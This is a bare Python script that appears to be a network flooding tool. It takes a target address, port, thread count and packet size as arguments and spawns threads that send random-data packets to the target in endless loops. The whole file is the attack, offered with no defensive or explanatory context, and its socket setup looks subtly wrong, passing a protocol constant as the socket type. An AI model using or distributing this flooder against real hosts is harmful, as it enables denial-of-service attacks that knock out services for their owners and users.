import os,sys
import random, socket, threading
ip = str(sys.argv[1])
ip = socket.gethostbyname(ip)
port = int(sys.argv[2])
threads = int(sys.argv[3])
conn = int(sys.argv[4])
psize = int(sys.argv[5])
def run():
    data = random._urandom(psize) # Packet Size
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
            s.sendto(data, (ip, port))
            print("[+] Sended ("+str(len(data))+").")
            for x in range(conn):
                s.sendto(data, (ip, port))
        except:
            s.close()

for y in range(threads):
    th = threading.Thread(target=run)
    th.start()
